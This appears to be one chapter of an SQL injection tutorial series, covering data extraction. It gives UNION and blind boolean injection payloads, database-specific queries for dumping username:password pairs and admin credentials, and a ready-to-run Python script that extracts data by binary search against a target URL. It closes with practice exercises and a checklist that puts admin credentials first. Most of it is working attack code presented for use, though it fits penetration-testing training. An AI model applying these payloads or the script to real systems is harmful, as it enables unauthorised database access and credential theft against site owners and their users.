# 07 - Data Extraction

## Efficient Data Dumping

Once schema known, extract data with minimal requests.

## Single-Row Extraction

### Basic SELECT

```sql
-- First row
SELECT username,password FROM users LIMIT 1

-- Specific row
SELECT username,password FROM users WHERE id=1

-- Nth row
SELECT username,password FROM users LIMIT 1 OFFSET 5
```

### Union Extraction

```sql
-- One row via UNION
UNION SELECT 1,username,password FROM users LIMIT 1--

-- Specific user
UNION SELECT 1,username,password FROM users WHERE username='admin'--
```

## Multi-Row Extraction Techniques

### 1. Concatenation (GROUP_CONCAT)

#### MySQL

```sql
-- All usernames (comma-separated)
SELECT group_concat(username) FROM users

-- All credentials (user:pass format)
SELECT group_concat(concat(username,':',password)) FROM users

-- With separator customization
SELECT group_concat(username SEPARATOR '|') FROM users

-- Limited count (prevent truncation)
SELECT group_concat(username) FROM users LIMIT 50
```

#### PostgreSQL

```sql
-- String aggregation
SELECT string_agg(username,',') FROM users

-- With format
SELECT string_agg(username||':'||password,',') FROM users

-- Ordered
SELECT string_agg(username,',' ORDER BY id) FROM users
```

#### MSSQL

```sql
-- FOR XML aggregation
SELECT username+',' FROM users FOR XML path('')

-- With STUFF for remove trailing comma
SELECT STUFF((SELECT ','+username FROM users FOR XML path('')),1,1,'')

-- Concatenated pairs
SELECT STUFF((SELECT ','+username+':'+password FROM users FOR XML path('')),1,1,'')
```

#### Oracle

```sql
-- LISTAGG (11g+)
SELECT listagg(username,',') WITHIN GROUP (ORDER BY id) FROM users

-- XMLAgg (older versions)
SELECT xmlagg(xmlelement(e,username||',')).extract('//text()') FROM users

-- SYS_CONNECT_BY_PATH (hierarchical)
SELECT SYS_CONNECT_BY_PATH(username,',') FROM users
START WITH id=1 CONNECT BY id=PRIOR id+1
```

### 2. Multi-Column Concatenation

```sql
-- MySQL: Multiple fields in one result
SELECT group_concat(
  concat_ws(':',id,username,password,email,is_admin)
) FROM users

-- Result: 1:admin:hash:admin@site.com:1,2:user:hash:user@site.com:0
```

### 3. Row-by-Row Extraction

```sql
-- Row 1
UNION SELECT 1,username,password FROM users LIMIT 0,1--

-- Row 2
UNION SELECT 1,username,password FROM users LIMIT 1,1--

-- Row 3
UNION SELECT 1,username,password FROM users LIMIT 2,1--
```

## Targeted Data Extraction

### Priority Targets

```sql
-- Admin users only
SELECT username,password FROM users WHERE is_admin=1
-- OR
SELECT username,password FROM users WHERE role='administrator'

-- Active users
SELECT username,password FROM users WHERE active=1 AND last_login > DATE_SUB(NOW(),INTERVAL 30 DAY)

-- Password patterns
SELECT username,password FROM users WHERE password LIKE '%pass%'

-- Email domains
SELECT username,email FROM users WHERE email LIKE '%@company.com'
```

### Conditional Extraction

```sql
-- Users with specific pattern
SELECT * FROM users WHERE username LIKE 'a%'

-- Recent records
SELECT * FROM orders WHERE order_date > '2024-01-01'

-- High-value orders
SELECT * FROM orders WHERE total_amount > 10000
```

## Password Hash Extraction

### Common Hash Types

| Hash Pattern                                                                                                                       | Type        | Example    |
| ---------------------------------------------------------------------------------------------------------------------------------- | ----------- | ---------- |
| `5f4dcc3b5aa765d61d8327deb882cf99`                                                                                                 | MD5         | "password" |
| `b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86` | SHA-512     | "password" |
| `$2a$10$N9qo8uLOickgx2ZMRZoMy.`                                                                                                    | bcrypt      | "password" |
| `$1$abc$def...`                                                                                                                    | MD5 crypt   | "password" |
| `sha1$1234$abcd...`                                                                                                                | Django SHA1 | "password" |

### Extract with Hash Type

```sql
-- Determine hash algorithm from length
SELECT
  username,
  password,
  CASE
    WHEN LENGTH(password)=32 THEN 'MD5'
    WHEN LENGTH(password)=40 THEN 'SHA1'
    WHEN LENGTH(password)=64 THEN 'SHA-256'
    WHEN password LIKE '$2a$%' THEN 'bcrypt'
    WHEN password LIKE '$1$%' THEN 'MD5-crypt'
    ELSE 'Unknown'
  END as hash_type
FROM users
```

## Blind Data Extraction

### Character-by-Character

```sql
-- First character from first username
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))=97--

-- Binary search for faster extraction
' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1))>100--
```

### Count-Based

```sql
-- Count admin users
' AND (SELECT COUNT(*) FROM users WHERE is_admin=1)>0--

-- Check if specific user exists
' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
```

### Automating Blind Extraction

```python
import requests
import string

def blind_extract(query, max_length=100):
    """Extract string via blind boolean SQLi"""
    result = ""

    for position in range(1, max_length + 1):
        found = False
        # Binary search for character code
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{position},1))>={mid}--"
            # Send request and check response
            response = requests.get(f"http://target.com/page?id=1{payload}")
            is_true = "Welcome" in response.text  # Adjust indicator
            if is_true:
                low = mid
            else:
                high = mid - 1
        char = chr(low)
        if char == '\x00' or char == ' ':
            break
        result += char
        print(f"Extracted: {result}")
    return result

# Usage
username = blind_extract("SELECT username FROM users WHERE id=1")
password = blind_extract("SELECT password FROM users WHERE id=1")
```

## Large Dataset Handling

### Chunked Extraction

```sql
-- Extract 100 rows at a time
-- Chunk 1: rows 1-100
SELECT * FROM users LIMIT 100

-- Chunk 2: rows 101-200
SELECT * FROM users LIMIT 100 OFFSET 100

-- Chunk 3: rows 201-300
SELECT * FROM users LIMIT 100 OFFSET 200
```

### WHERE Clause Segmentation

```sql
-- By ID range
SELECT * FROM users WHERE id BETWEEN 1 AND 100
SELECT * FROM users WHERE id BETWEEN 101 AND 200

-- By username pattern
SELECT * FROM users WHERE username LIKE 'a%'
SELECT * FROM users WHERE username LIKE 'b%'
```

### Date-Based Segmentation

```sql
-- By month
SELECT * FROM orders WHERE MONTH(order_date)=1 AND YEAR(order_date)=2024
SELECT * FROM orders WHERE MONTH(order_date)=2 AND YEAR(order_date)=2024
```

## Practice Exercises

### Exercise 1: Single Table Dump

Target: Table `users` with columns: id, username, password, email

Extract all records in format: `username:password:email`

### Exercise 2: Admin-Only Extraction

From table `users`, extract only users with `is_admin=1` or `role='admin'`.

### Exercise 3: Hash Analysis

Extract passwords and identify hash algorithm from length and pattern.

### Exercise 4: Blind Data Extraction

Scenario: No direct output. Use blind extraction to get first 5 usernames.

### Exercise 5: Large Dataset

Table `logs` has 10,000+ rows. Design strategy to extract in manageable chunks.

## Extraction Checklist

- [ ] Identify target tables (users, admin, sensitive data)
- [ ] Enumerate columns to understand data structure
- [ ] Extract high-priority data first (admin credentials)
- [ ] Use concatenation to minimize requests
- [ ] Document extracted data with context
- [ ] Verify completeness (row counts match)
- [ ] Handle large datasets with chunking

## Next Step

Continue to [08 - Blind Injection](08-Blind-Injection.md) for techniques when direct data extraction is not available.
